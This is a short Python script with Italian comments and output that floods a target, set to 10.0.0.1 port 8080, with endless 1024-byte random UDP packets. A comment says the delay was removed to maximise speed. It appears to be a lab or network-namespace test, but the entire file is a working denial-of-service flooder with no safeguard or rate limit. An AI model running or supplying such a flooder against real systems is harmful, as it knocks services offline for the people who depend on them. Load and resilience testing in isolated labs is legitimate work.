import socket
import random
import time

TARGET_IP = "10.0.0.1" 
TARGET_PORT = 8080
BYTES = random._urandom(1024)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print(f"💣 FUOCO da dentro il namespace verso {TARGET_IP}...")

sent = 0
try:
    while True:
        sock.sendto(BYTES, (TARGET_IP, TARGET_PORT))
        sent += 1
        if sent % 10000 == 0:
            print(f"🚀 {sent} pacchetti...", end='\r')
        # Rimuoviamo lo sleep per massimizzare la velocità
except KeyboardInterrupt:
    pass